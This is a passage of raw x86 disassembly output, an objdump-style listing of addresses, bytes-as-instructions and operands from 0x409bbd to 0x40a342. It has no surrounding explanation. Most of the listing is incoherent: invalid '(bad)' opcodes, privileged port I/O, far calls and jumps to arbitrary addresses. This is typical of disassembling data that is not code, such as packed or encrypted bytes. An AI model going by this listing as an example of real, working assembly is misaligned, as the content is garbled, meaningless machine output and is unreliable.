  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	xor    DWORD PTR es:0x7eea8e88,ebx
  409bda:	jle    0x409c4c
  409bdc:	jns    0x409c5c
  409bde:	jle    0x409c4b
  409be0:	jg     0x409bcb
  409be2:	adc    edx,esi
  409be4:	rcr    DWORD PTR [eax-0xe],cl
  409be7:	loope  0x409bda
  409be9:	and    eax,0xee98a584
  409bee:	lods   al,BYTE PTR ds:[esi]
  409bef:	dec    edx
  409bf0:	in     al,0xf3
  409bf2:	and    eax,0x8c620fb
  409bf7:	mov    eax,ds:0x3b778c03
  409bfc:	inc    eax
  409bfd:	cdq    
  409bfe:	icebp  
  409bff:	sbb    al,0xba
  409c01:	out    dx,eax
  409c02:	jle    0x409bc0
  409c04:	je     0x409ba9
  409c06:	out    dx,al
  409c07:	popf   
  409c08:	jle    0x409c66
  409c0a:	fnstcw WORD PTR [eax+0x6f8b984e]
  409c10:	cmp    BYTE PTR [esi+0x5c0e7935],bl
  409c16:	pop    edx
  409c17:	adc    al,ah
  409c19:	push   ebx
  409c1a:	push   esp
  409c1b:	xchg   edx,eax
  409c1c:	lock fistp WORD PTR ds:[edx]
  409c20:	xor    BYTE PTR [ebx-0x7d],cl
  409c23:	scas   al,BYTE PTR es:[edi]
  409c24:	shr    DWORD PTR [ebx+0x4cc9812f],0x44
  409c2b:	mov    dl,0x77
  409c2d:	sub    ecx,DWORD PTR [ebp+eiz*2-0x80]
  409c31:	pop    eax
  409c32:	imul   edx,DWORD PTR [edx+0x47d89f53],0xffffffa7
  409c39:	mov    edi,0x3a16f17c
  409c3e:	mov    ecx,0xbb2f2e0b
  409c43:	xchg   dl,bh
  409c45:	jge    0x409c23
  409c47:	sbb    DWORD PTR [ecx-0x5b],esi
  409c4a:	cmp    DWORD PTR [edx-0x26844f14],0xffffff8e
  409c51:	jl     0x409c51
  409c53:	jmp    0x92953715
  409c58:	jmpw   0x469d
  409c5c:	or     bh,BYTE PTR [edx+0x2b61800f]
  409c62:	or     bl,BYTE PTR [edi]
  409c64:	in     eax,dx
  409c65:	mov    WORD PTR [ebx+edx*8+0x257342b1],?
  409c6c:	es push es
  409c6e:	cli    
  409c6f:	ja     0x409c4f
  409c71:	out    0xe5,al
  409c73:	dec    BYTE PTR [esi-0x38]
  409c76:	add    BYTE PTR [eax],al
  409c78:	fwait
  409c79:	(bad)  
  409c7a:	call   0xa42:0x3251055c
  409c81:	in     al,0xef
  409c83:	mov    eax,0xd4b9b95e
  409c88:	lods   al,BYTE PTR ds:[esi]
  409c89:	inc    edx
  409c8a:	add    eax,0x1d40c317
  409c8f:	je     0x409c46
  409c91:	adc    eax,DWORD PTR ds:0x46c6bac3
  409c97:	dec    ebp
  409c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c99:	sub    eax,0x160e0c9e
  409c9e:	sbb    DWORD PTR [edi-0x24],eax
  409ca1:	dec    BYTE PTR [ebp+0xd]
  409ca4:	and    eax,0x8f0cb08d
  409ca9:	in     eax,0xa5
  409cab:	mov    bh,0xb6
  409cad:	mov    ecx,0x9626709
  409cb2:	pop    es
  409cb3:	test   DWORD PTR [ecx],edi
  409cb5:	xchg   edi,eax
  409cb6:	xlat   BYTE PTR ds:[ebx]
  409cb7:	fdiv   st(1),st
  409cb9:	out    dx,al
  409cba:	int3   
  409cbb:	int    0x63
  409cbd:	push   ss
  409cbe:	ins    BYTE PTR es:[edi],dx
  409cbf:	mov    esi,0xb6292424
  409cc4:	dec    edi
  409cc5:	dec    esp
  409cc6:	pop    eax
  409cc7:	mov    ebp,0x2eb053c9
  409ccc:	pop    es
  409ccd:	inc    ebp
  409cce:	mov    ch,0xbd
  409cd0:	or     bh,BYTE PTR ds:0xbdd75f5e
  409cd6:	fmul   DWORD PTR [esi-0x226b2d4d]
  409cdc:	cs jns 0x409cbe
  409cdf:	inc    esp
  409ce0:	dec    esi
  409ce1:	gs sbb ah,cl
  409ce4:	push   cs
  409ce5:	adc    DWORD PTR [eax],edx
  409ce7:	jmp    0xe57caef2
  409cec:	cmp    ch,dh
  409cee:	mov    esi,0x1f49284b
  409cf3:	in     eax,0xb5
  409cf5:	pushf  
  409cf6:	and    DWORD PTR [edi-0x29],edx
  409cf9:	and    al,0x5c
  409cfb:	add    bl,bl
  409cfd:	sub    edx,DWORD PTR [ecx+0x63]
  409d00:	and    cl,bh
  409d02:	or     DWORD PTR [esi],ecx
  409d04:	out    0x48,eax
  409d06:	mov    DWORD PTR [eax+0x5f917e1f],ebx
  409d0c:	ins    BYTE PTR es:[edi],dx
  409d0d:	rcr    DWORD PTR [ebp-0x11],1
  409d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d11:	cs cmp al,0x78
  409d14:	mov    ch,0xfe
  409d16:	(bad)  [edx+0x5d75a73f]
  409d1c:	cmp    al,0xb5
  409d1e:	cmp    eax,0xa4f0fd3a
  409d23:	fwait
  409d24:	dec    esi
  409d25:	aam    0x43
  409d27:	sub    esi,DWORD PTR [eax-0x56]
  409d2a:	cmp    eax,DWORD PTR [ecx]
  409d2c:	mov    DWORD PTR [ebp-0x1bb10b70],ebx
  409d32:	xchg   DWORD PTR [edx-0x19],edi
  409d35:	pop    ss
  409d36:	adc    edi,edi
  409d38:	add    ch,bl
  409d3a:	add    dh,bl
  409d3c:	sti    
  409d3d:	aad    0x42
  409d3f:	(bad)  
  409d40:	or     bh,bh
  409d42:	xchg   esp,edi
  409d44:	pop    esp
  409d45:	sbb    BYTE PTR [esi+0x48],bl
  409d48:	push   ebx
  409d49:	outs   dx,DWORD PTR ds:[esi]
  409d4a:	adc    bh,BYTE PTR [edx-0x7ff3a46d]
  409d50:	sti    
  409d51:	into   
  409d52:	int    0x8a
  409d54:	push   ecx
  409d55:	loop   0x409d89
  409d57:	pushf  
  409d58:	sub    eax,0x941016d9
  409d5d:	loope  0x409ceb
  409d5f:	cld    
  409d60:	inc    eax
  409d61:	call   0x81de:0x68c1c71d
  409d68:	sbb    BYTE PTR [ebp-0x40],ah
  409d6b:	push   esi
  409d6c:	lock sahf 
  409d6e:	jae    0x409d82
  409d70:	xchg   ebx,eax
  409d71:	mov    esi,0x2ad134fa
  409d76:	sub    cl,BYTE PTR [edx]
  409d78:	mov    al,ds:0x6d0585cf
  409d7d:	aas    
  409d7e:	mov    eax,ds:0x39e7697
  409d83:	mov    eax,ds:0xfc948472
  409d88:	push   0x723d56ca
  409d8d:	sbb    al,0x4a
  409d8f:	fisubr DWORD PTR [edi]
  409d91:	cmp    bh,BYTE PTR [eax+ebx*8]
  409d94:	pop    ss
  409d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d96:	or     al,0xbc
  409d99:	idiv   DWORD PTR [esp+ecx*8+0x9]
  409d9d:	sbb    dh,BYTE PTR [eax-0x19]
  409da0:	mov    bl,0x4e
  409da2:	mov    DWORD PTR [esi],ecx
  409da4:	popf   
  409da5:	daa    
  409da6:	(bad)  
  409da7:	xchg   BYTE PTR [esi+0x39ba905e],dh
  409dad:	fwait
  409dae:	mov    edi,0xf696ebc9
  409db3:	inc    edx
  409db4:	fnstsw WORD PTR [edx+0x48f2d16f]
  409dba:	and    edx,DWORD PTR [ebx+0x17]
  409dbd:	sub    DWORD PTR [bp+di],ebx
  409dc0:	gs inc esi
  409dc2:	or     ecx,edi
  409dc4:	mov    ah,0x16
  409dc6:	push   edx
  409dc7:	outs   dx,BYTE PTR ds:[esi]
  409dc8:	mov    bl,0x5d
  409dca:	mov    cl,0x1c
  409dcc:	jbe    0x409e36
  409dce:	cmp    dl,cl
  409dd0:	xchg   BYTE PTR [ebx],cl
  409dd2:	and    al,cl
  409dd4:	xor    ah,cl
  409dd6:	mov    ebp,0xa962c4c6
  409ddb:	sahf   
  409ddc:	arpl   WORD PTR [ecx+0x228d92ff],si
  409de2:	pop    eax
  409de3:	mov    dh,0xaa
  409de5:	in     eax,0x77
  409de7:	inc    ecx
  409de8:	mov    eax,0x8aeefccf
  409ded:	sub    BYTE PTR [edi+0x8],0xd2
  409df1:	(bad)  
  409df2:	push   ebx
  409df3:	(bad)  
  409df4:	pop    ds
  409df5:	cmp    eax,ecx
  409df7:	leave  
  409df8:	sbb    DWORD PTR [ebx+eiz*1],0xffffff88
  409dfc:	je     0x409de9
  409dfe:	cmp    BYTE PTR [ebx+0x33],ah
  409e01:	jae    0x409e52
  409e03:	retf   0x9cbe
  409e06:	pop    eax
  409e07:	mov    cl,0xe6
  409e09:	cmp    bh,BYTE PTR [eax+eiz*2]
  409e0c:	popa   
  409e0d:	mov    ebp,0xe9d3d6bc
  409e12:	popa   
  409e13:	arpl   WORD PTR [ebx+0x49a01deb],bp
  409e19:	stos   DWORD PTR es:[edi],eax
  409e1a:	xchg   DWORD PTR [edx],edi
  409e1c:	les    esi,FWORD PTR [edx]
  409e1e:	sub    DWORD PTR [edi+0x1122fa94],edx
  409e24:	daa    
  409e25:	frstor [ecx+0x7d1e4b53]
  409e2b:	cmp    BYTE PTR [ecx+0x71],ah
  409e2e:	or     al,ch
  409e30:	data16 cmp bl,BYTE PTR [ecx+0x2f]
  409e34:	push   ebp
  409e35:	cmp    al,0xc3
  409e37:	or     al,0x96
  409e39:	add    eax,0x1e4d51c3
  409e3e:	mov    DWORD PTR [ecx+eiz*8+0x15428a2c],ebx
  409e45:	jl     0x409e85
  409e47:	ins    DWORD PTR es:[edi],dx
  409e48:	jbe    0x409e24
  409e4a:	fmul   st(6),st
  409e4c:	sbb    eax,0x19b801c1
  409e51:	and    BYTE PTR [edi-0x10],bh
  409e54:	cld    
  409e55:	cmp    eax,ebp
  409e57:	ret    0xef8a
  409e5a:	fisubr WORD PTR [eax+0x1fc3e441]
  409e60:	mov    esi,0x1e4b3572
  409e65:	and    al,0x7a
  409e67:	xchg   ebp,eax
  409e68:	mov    ds:0x430c18d9,eax
  409e6d:	add    al,0x68
  409e6f:	xchg   esi,eax
  409e70:	fiadd  WORD PTR [ebx+ebp*4-0xf4e9425]
  409e77:	mov    WORD PTR [ebp-0x7dbdccbb],fs
  409e7d:	jnp    0x409ec3
  409e7f:	lods   al,BYTE PTR ds:[esi]
  409e80:	jecxz  0x409e67
  409e82:	fwait
  409e83:	mov    es,eax
  409e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e86:	add    al,0x66
  409e88:	jo     0x409ec3
  409e8a:	test   DWORD PTR [ebx+0x5b],ebx
  409e8d:	popf   
  409e8e:	mov    esi,0x7d4142d9
  409e93:	inc    edi
  409e94:	ss jp  0x409e6c
  409e97:	pusha  
  409e98:	jne    0x409e9b
  409e9a:	lods   al,BYTE PTR ds:[esi]
  409e9b:	and    al,0x5c
  409e9d:	mov    ds:0x1571921,eax
  409ea2:	and    al,0xf3
  409ea4:	inc    ecx
  409ea5:	fdiv   DWORD PTR [eax]
  409ea7:	jb     0x409ed0
  409ea9:	ret    0x5df
  409eac:	and    dl,BYTE PTR [ebp+0x43b3e1c8]
  409eb2:	mov    esi,0x5e7ad0a7
  409eb7:	push   edx
  409eb8:	leave  
  409eb9:	push   edi
  409eba:	xchg   ecx,eax
  409ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ebc:	lahf   
  409ebd:	mov    eax,ds:0xf85d6654
  409ec2:	hlt    
  409ec3:	ja     0x409eac
  409ec5:	fcmovu st,st(5)
  409ec7:	(bad)  
  409ec8:	std    
  409ec9:	mov    ebp,0xe3b3281a
  409ece:	xor    eax,0xb3a0afb1
  409ed3:	pop    ecx
  409ed4:	mov    ah,0xad
  409ed6:	jb     0x409f46
  409ed8:	sbb    al,dh
  409eda:	test   DWORD PTR ds:0x83539a90,edi
  409ee0:	in     eax,dx
  409ee1:	stos   DWORD PTR es:[edi],eax
  409ee2:	stc    
  409ee3:	out    0xdc,al
  409ee5:	std    
  409ee6:	mov    ah,0xce
  409ee8:	(bad)  
  409ee9:	sahf   
  409eea:	dec    esi
  409eeb:	mov    cl,0x1d
  409eed:	push   ecx
  409eee:	pop    esp
  409eef:	repnz cs aad 0xc5
  409ef3:	xchg   edi,eax
  409ef4:	and    cl,BYTE PTR [ecx]
  409ef6:	fnstcw WORD PTR [eax+0x45cebc76]
  409efc:	push   esp
  409efd:	out    0xa4,eax
  409eff:	or     BYTE PTR [ebx],ch
  409f01:	stos   DWORD PTR es:[edi],eax
  409f02:	cdq    
  409f03:	adc    ebx,DWORD PTR cs:[ebx+0x4d2d6c62]
  409f0a:	dec    esi
  409f0b:	or     al,0xe1
  409f0d:	adc    edi,ebp
  409f0f:	pop    esp
  409f10:	xchg   ebx,eax
  409f11:	cwde   
  409f12:	adc    eax,0xea391eed
  409f17:	punpcklwd mm7,DWORD PTR [ecx+0x7dd2b870]
  409f1e:	fnstenv es:[ecx+0x38]
  409f22:	out    dx,eax
  409f23:	add    BYTE PTR [edi],al
  409f25:	mov    ebp,0xb14b3a69
  409f2a:	adc    ah,0xb2
  409f2d:	(bad)  
  409f2e:	lock ror ah,cl
  409f31:	stc    
  409f32:	ja     0x409f61
  409f34:	gs loope 0x409f3e
  409f37:	punpckhbw mm4,QWORD PTR [ebx]
  409f3a:	and    eax,0xfee1fe00
  409f3f:	xchg   ebp,eax
  409f40:	std    
  409f41:	cwde   
  409f42:	repz pop esp
  409f44:	cmp    ch,BYTE PTR es:[eax-0x2e]
  409f48:	sub    DWORD PTR [ebp-0x4fd3f735],edi
  409f4e:	jns    0x409f79
  409f50:	call   0x766e:0x48a4bc2
  409f57:	jnp    0x409f6f
  409f59:	jmp    0x409f84
  409f5b:	jecxz  0x409f80
  409f5d:	inc    edx
  409f5e:	push   edi
  409f5f:	loopne 0x409f1d
  409f61:	cmp    DWORD PTR [ebp-0x4f],esi
  409f64:	xor    al,0x54
  409f66:	stos   DWORD PTR es:[edi],eax
  409f67:	arpl   WORD PTR [eax+ebp*4],sp
  409f6a:	jg     0x409f7f
  409f6c:	sahf   
  409f6d:	adc    BYTE PTR [ecx+0x1e0ec12d],cl
  409f73:	outs   dx,DWORD PTR ss:[esi]
  409f75:	mov    bh,0xa0
  409f77:	loop   0x409fb9
  409f79:	(bad)  
  409f7a:	ins    BYTE PTR es:[edi],dx
  409f7b:	xor    BYTE PTR [esp+edx*1+0x5c],ch
  409f7f:	aas    
  409f80:	push   edi
  409f81:	cmp    ch,BYTE PTR [ecx-0x4a0ae52c]
  409f87:	mov    ch,0xea
  409f89:	mov    eax,ds:0xe304d690
  409f8e:	lahf   
  409f8f:	gs or  al,0xef
  409f92:	hlt    
  409f93:	xor    BYTE PTR [ebp-0x6d],0x4c
  409f97:	test   DWORD PTR [ebp+ebp*8-0x48],ebp
  409f9b:	sbb    BYTE PTR [esp+eax*8+0x77156a5f],0x9b
  409fa3:	bound  esi,QWORD PTR [ebp-0x21]
  409fa6:	cmp    ebx,DWORD PTR [eax]
  409fa8:	sahf   
  409fa9:	int    0x88
  409fab:	aas    
  409fac:	mov    ds:0xd26c1ed7,al
  409fb1:	pop    eax
  409fb2:	das    
  409fb3:	ret    
  409fb4:	jmp    0x3fa557ac
  409fb9:	sub    bl,BYTE PTR [edx]
  409fbb:	retf   0x1a41
  409fbe:	scas   al,BYTE PTR es:[edi]
  409fbf:	mov    ch,0xff
  409fc1:	mov    edi,0xd88f6a05
  409fc6:	mov    ss,esp
  409fc8:	sub    eax,0x18a710b7
  409fcd:	dec    ebp
  409fce:	loope  0x40a03d
  409fd0:	call   0xdad0cd54
  409fd5:	and    ebp,DWORD PTR ds:0x45c7ccd2
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fst    DWORD PTR [eax-0x80]
  409ff5:	pop    esp
  409ff6:	inc    esp
  409ff7:	xor    dh,0x7e
  409ffa:	jle    0x40a06c
  409ffc:	jns    0x40a07c
  409ffe:	jle    0x40a040
  40a000:	in     eax,dx
  40a001:	adc    ebx,edi
  40a003:	push   esi
  40a004:	aad    0xd6
  40a006:	or     esp,DWORD PTR [ebx]
  40a008:	and    al,0x5a
  40a00a:	call   0x3a8f8b42
  40a00f:	gs xchg esp,eax
  40a011:	mov    al,ah
  40a013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a014:	inc    esp
  40a015:	or     eax,DWORD PTR [edi+0x24442479]
  40a01b:	dec    ebx
  40a01c:	loop   0x40a099
  40a01e:	cmp    BYTE PTR [eax-0x798a10ec],ah
  40a024:	shl    DWORD PTR [ecx-0x1a],1
  40a027:	push   ecx
  40a028:	add    al,0xee
  40a02a:	mov    DWORD PTR [esi+0x17042084],ecx
  40a030:	(bad)  
  40a031:	fidiv  WORD PTR [ecx+ebx*8-0xc]
  40a035:	inc    edi
  40a036:	add    esi,DWORD PTR [ebx+eax*8-0x72]
  40a03a:	xlat   BYTE PTR ds:[ebx]
  40a03b:	js     0x40a0bc
  40a03d:	jge    0x40a07f
  40a03f:	jp     0x40a08c
  40a041:	and    dh,BYTE PTR [ecx+edx*2-0xd]
  40a045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a046:	push   esi
  40a047:	sar    BYTE PTR [ebp-0x7279ba03],0x72
  40a04e:	mov    eax,ds:0xf2486e03
  40a053:	fnstenv [edx]
  40a055:	jmp    0xcf99:0x45edf9ac
  40a05c:	lods   al,BYTE PTR ds:[esi]
  40a05d:	fsubr  QWORD PTR [esp+eax*2-0x37]
  40a061:	call   0xd7f1:0x4c77403a
  40a068:	out    dx,al
  40a069:	mov    dl,0xf4
  40a06b:	mov    al,0x3d
  40a06d:	push   ss
  40a06e:	pop    edi
  40a06f:	in     al,0x49
  40a071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a072:	jb     0x40a0d0
  40a074:	lock jp 0x40a0a4
  40a077:	out    dx,al
  40a078:	dec    ebp
  40a079:	scas   al,BYTE PTR es:[edi]
  40a07a:	xor    BYTE PTR [ebx],dh
  40a07c:	repz adc BYTE PTR [ecx],0xe3
  40a080:	loopne 0x40a038
  40a082:	call   0xc4d3:0x3d498ced
  40a089:	sub    al,0x40
  40a08c:	xchg   ecx,eax
  40a08d:	retf   
  40a08e:	pop    eax
  40a08f:	push   ebp
  40a090:	iret   
  40a091:	mov    cl,0x39
  40a093:	dec    esi
  40a094:	test   al,0xd9
  40a096:	loop   0x40a061
  40a098:	cmp    al,0x4b
  40a09a:	jmp    0x6289:0x9308e1dc
  40a0a1:	push   ebx
  40a0a2:	sbb    eax,0xbd87962a
  40a0a7:	jb     0x40a06f
  40a0a9:	inc    eax
  40a0aa:	jno    0x40a080
  40a0ac:	lods   eax,DWORD PTR ds:[esi]
  40a0ad:	xor    al,dl
  40a0af:	ds ret 0x23e2
  40a0b3:	mov    dl,bh
  40a0b5:	sahf   
  40a0b6:	cmp    al,0xf2
  40a0b8:	je     0x40a0b8
  40a0ba:	ret    
  40a0bb:	push   ss
  40a0bc:	aam    0xe0
  40a0be:	push   esp
  40a0bf:	dec    BYTE PTR [edi]
  40a0c1:	mov    ecx,0x76ede70b
  40a0c6:	adc    ecx,edx
  40a0c8:	or     edi,edi
  40a0ca:	jecxz  0x40a088
  40a0cc:	adc    al,0x97
  40a0ce:	mov    eax,ds:0x43035082
  40a0d3:	sti    
  40a0d4:	inc    ebp
  40a0d5:	scas   al,BYTE PTR es:[edi]
  40a0d6:	sub    DWORD PTR [edx-0x55],esi
  40a0d9:	ret    0x7ebb
  40a0dc:	pop    esi
  40a0dd:	xor    DWORD PTR [ecx+0x5],0x167f0f90
  40a0e4:	adc    BYTE PTR [edx],ch
  40a0e6:	xchg   esi,eax
  40a0e7:	adc    esi,ebp
  40a0e9:	loopne 0x40a0dc
  40a0eb:	fisubr DWORD PTR ds:0x985018d9
  40a0f1:	fs icebp 
  40a0f3:	or     ah,bl
  40a0f5:	call   0xae071d0c
  40a0fa:	mov    dh,0x3c
  40a0fc:	pop    ebx
  40a0fd:	ins    BYTE PTR es:[edi],dx
  40a0fe:	or     al,0xfc
  40a100:	fs daa 
  40a102:	into   
  40a103:	out    dx,eax
  40a104:	mov    ebp,0x43f14984
  40a109:	mov    al,0x1a
  40a10b:	adc    eax,0x4c816306
  40a110:	leave  
  40a111:	out    dx,eax
  40a112:	mov    WORD PTR [ebp+ecx*1-0x3251910b],es
  40a119:	mov    edx,0xe51ff973
  40a11e:	push   esp
  40a11f:	cmp    al,ch
  40a121:	cli    
  40a122:	ror    BYTE PTR [ebx-0x61125cab],1
  40a128:	in     eax,dx
  40a129:	mov    dl,BYTE PTR [esi+0x29a6ab0f]
  40a12f:	push   0x68
  40a131:	dec    eax
  40a132:	in     eax,0xa0
  40a134:	inc    edi
  40a135:	sub    eax,0x9393ac52
  40a13a:	outs   dx,DWORD PTR ds:[esi]
  40a13b:	xchg   esp,eax
  40a13c:	jne    0x40a134
  40a13e:	push   esi
  40a13f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a141:	xchg   esi,eax
  40a142:	and    BYTE PTR ds:0xa0275440,dh
  40a148:	mov    bh,0xb
  40a14a:	lds    esi,FWORD PTR [ecx]
  40a14c:	push   edi
  40a14d:	(bad)  
  40a14e:	jl     0x40a1bf
  40a150:	pop    es
  40a151:	aas    
  40a152:	cmp    esi,DWORD PTR ds:0x9e1bbc0d
  40a158:	pop    edx
  40a159:	mov    edx,0xfaae493
  40a15e:	addr16 enter 0x8ae7,0x3e
  40a163:	inc    esp
  40a164:	inc    eax
  40a165:	popw   ds
  40a167:	(bad)
  40a16b:	and    dh,BYTE PTR [edx+ebp*2+0x2a870343]
  40a172:	ss push esi
  40a174:	mov    BYTE PTR [ebx+0x73],bh
  40a177:	push   0xffffffb3
  40a179:	add    BYTE PTR [esi],cl
  40a17b:	stos   DWORD PTR es:[edi],eax
  40a17c:	xchg   esi,eax
  40a17d:	aad    0x47
  40a17f:	sbb    edx,DWORD PTR [eax-0x781bd2e1]
  40a185:	int3   
  40a186:	arpl   sp,ax
  40a188:	pushf  
  40a189:	pop    ss
  40a18a:	inc    edi
  40a18b:	add    dl,BYTE PTR [ecx-0x3f]
  40a18e:	std    
  40a18f:	xchg   ebx,eax
  40a190:	mov    ah,cl
  40a192:	push   0xffffffeb
  40a194:	repnz xchg edi,eax
  40a196:	push   0xb11acd1a
  40a19b:	cmp    DWORD PTR ds:0x21190e74,edx
  40a1a1:	xchg   DWORD PTR [ecx+0x730ac6d9],edx
  40a1a7:	nop
  40a1a8:	inc    ecx
  40a1a9:	xchg   ch,dh
  40a1ab:	jo     0x40a160
  40a1ad:	(bad)  
  40a1ae:	cmp    dh,0xe0
  40a1b1:	mov    esp,0x585b3baf
  40a1b6:	add    al,0x11
  40a1b8:	cmp    cl,cl
  40a1ba:	lahf   
  40a1bb:	push   ds
  40a1bc:	jmp    0x87ec6952
  40a1c1:	pop    ebx
  40a1c2:	test   cl,0xa5
  40a1c5:	inc    edx
  40a1c6:	test   al,0x85
  40a1c8:	ja     0x40a1d0
  40a1ca:	leave  
  40a1cb:	pushf  
  40a1cc:	jecxz  0x40a1a1
  40a1ce:	js     0x40a24d
  40a1d0:	aas    
  40a1d1:	cmp    ecx,edx
  40a1d3:	jmp    FWORD PTR [ebp+edi*2-0x2754cbfe]
  40a1da:	dec    esp
  40a1db:	push   edi
  40a1dc:	imul   BYTE PTR [ebx-0x2f]
  40a1df:	out    dx,eax
  40a1e0:	ins    DWORD PTR es:[edi],dx
  40a1e1:	xchg   esp,eax
  40a1e2:	pop    edx
  40a1e3:	jae    0x40a178
  40a1e5:	jp     0x40a241
  40a1e7:	jb     0x40a265
  40a1e9:	sbb    al,0x87
  40a1eb:	inc    edi
  40a1ec:	rcl    DWORD PTR [ecx],0x5b
  40a1ef:	jmp    0x40a1b0
  40a1f1:	jp     0x40a1ab
  40a1f3:	pop    ds
  40a1f4:	cwde   
  40a1f5:	inc    eax
  40a1f6:	mov    esp,es
  40a1f8:	imul   edx,DWORD PTR [ebx-0x77db8ed1],0x57f9c4ae
  40a202:	in     al,dx
  40a203:	std    
  40a204:	loop   0x40a25b
  40a206:	jmp    0x6329:0x5b448136
  40a20d:	sub    ecx,DWORD PTR [ecx+edi*2]
  40a210:	lods   eax,DWORD PTR ds:[esi]
  40a211:	xor    ch,bl
  40a213:	mov    ah,0xa4
  40a215:	mov    ds:0xc3049a4a,eax
  40a21a:	cwde   
  40a21b:	fisttp DWORD PTR [ebp-0x731e0cb1]
  40a221:	into   
  40a222:	or     DWORD PTR [ebx],esi
  40a224:	(bad)  
  40a226:	xor    eax,0x53e97a81
  40a22b:	mov    gs,WORD PTR [ecx]
  40a22d:	(bad)  
  40a22e:	fadd   DWORD PTR [esi-0x4f19a486]
  40a234:	add    al,0xb
  40a236:	jbe    0x40a1fa
  40a238:	add    al,al
  40a23a:	dec    ebx
  40a23b:	inc    edx
  40a23c:	push   ebx
  40a23d:	rol    DWORD PTR [edx],1
  40a23f:	scas   al,BYTE PTR es:[edi]
  40a240:	jmp    0x40a211
  40a242:	scas   al,BYTE PTR es:[edi]
  40a243:	adc    al,0x5c
  40a245:	sbb    al,0x41
  40a247:	bound  eax,QWORD PTR [ebx-0x6c]
  40a24a:	sbb    DWORD PTR [ecx],edi
  40a24c:	sub    DWORD PTR [eax+ebp*8],0x63
  40a250:	imul   ecx,esi,0x8
  40a253:	inc    esi
  40a254:	mov    al,ds:0xc72f4b63
  40a259:	jge    0x40a1f8
  40a25b:	xchg   edi,eax
  40a25c:	mov    esi,0xd0ba2a43
  40a261:	add    ebx,DWORD PTR [ecx*1-0x5a9a8228]
  40a268:	in     eax,dx
  40a269:	inc    edx
  40a26a:	dec    edx
  40a26b:	mov    ds:0xb9d99776,al
  40a270:	mov    ebp,0x11d0f13a
  40a275:	fdiv   QWORD PTR [esi+0x6d]
  40a278:	inc    edi
  40a279:	out    dx,al
  40a27a:	std    
  40a27b:	in     eax,0xb1
  40a27d:	xor    DWORD PTR [ebp+ebx*1-0x7],ebx
  40a281:	(bad)  
  40a282:	idiv   ebx
  40a284:	xchg   edx,eax
  40a285:	sbb    al,0x8b
  40a287:	(bad)  
  40a288:	fistp  WORD PTR [esi+ebp*2+0x25]
  40a28c:	add    ecx,DWORD PTR [eax+0x5eea5c5]
  40a292:	or     eax,0x9787db8e
  40a297:	iret   
  40a298:	ins    BYTE PTR es:[edi],dx
  40a299:	pop    eax
  40a29a:	pop    esi
  40a29b:	xchg   ebp,eax
  40a29c:	into   
  40a29d:	inc    edi
  40a29e:	or     ebp,edi
  40a2a0:	(bad)  
  40a2a1:	jmp    0x40a246
  40a2a3:	clc    
  40a2a4:	mov    ds:0x1e4068e5,al
  40a2a9:	push   ss
  40a2aa:	popa   
  40a2ab:	out    dx,al
  40a2ac:	call   0x8038:0xd3ea1396
  40a2b3:	pop    es
  40a2b4:	add    DWORD PTR [ebx],esp
  40a2b6:	pop    ds
  40a2b7:	push   es
  40a2b8:	cmp    DWORD PTR [bp+si],ebp
  40a2bb:	lods   al,BYTE PTR ds:[esi]
  40a2bc:	aad    0x7a
  40a2be:	jmp    0x40a2b6
  40a2c0:	sbb    ch,ah
  40a2c2:	sbb    DWORD PTR [ebx-0x1e],0x50
  40a2c6:	leave  
  40a2c7:	repz cwde 
  40a2c9:	ins    DWORD PTR es:[edi],dx
  40a2ca:	repz div DWORD PTR [edi-0x704dc5e3]
  40a2d1:	add    esi,DWORD PTR ds:0x6add70e5
  40a2d7:	(bad)  
  40a2d8:	scas   eax,DWORD PTR es:[edi]
  40a2d9:	cmp    ebx,0x1
  40a2dc:	in     eax,dx
  40a2dd:	xor    al,BYTE PTR [ebp-0xf]
  40a2e0:	lods   al,BYTE PTR ds:[esi]
  40a2e1:	js     0x40a309
  40a2e3:	outs   dx,BYTE PTR ds:[esi]
  40a2e4:	cmp    eax,0xf8bf7411
  40a2e9:	stc    
  40a2ea:	cmc    
  40a2eb:	adc    DWORD PTR [ebx],ecx
  40a2ed:	gs xchg esi,eax
  40a2ef:	cli    
  40a2f0:	jmp    0xcf49:0x8c9988a1
  40a2f7:	xchg   edx,eax
  40a2f8:	sahf   
  40a2f9:	sbb    al,0x0
  40a2fb:	pop    edi
  40a2fc:	mov    dh,0xcc
  40a2fe:	inc    esi
  40a2ff:	cmp    eax,0xbbc1c65c
  40a304:	mov    bl,0xe7
  40a306:	cmp    ecx,DWORD PTR [ebp+0x2a]
  40a309:	call   0xb6ae:0x35a566e4
  40a310:	push   edi
  40a311:	fistp  WORD PTR [ecx]
  40a313:	(bad)  
  40a314:	fdivr  QWORD PTR [edi-0x6e5c1f29]
  40a31a:	in     eax,dx
  40a31b:	jae    0x40a352
  40a31d:	sub    al,0xd7
  40a31f:	sub    BYTE PTR [esi+0x48531447],ah
  40a325:	push   eax
  40a326:	cmc    
  40a327:	mov    eax,ds:0x62965ea0
  40a32c:	cmc    
  40a32d:	loop   0x40a3a3
  40a32f:	out    0x2e,al
  40a331:	xchg   esi,eax
  40a332:	mov    esi,0x9ca1d5d9
  40a337:	test   eax,0xb0ab201e
  40a33c:	push   ecx
  40a33d:	xor    eax,0x1f956bb1
  40a342:	xor    ebp,DWORD PTR [esi-0x21]
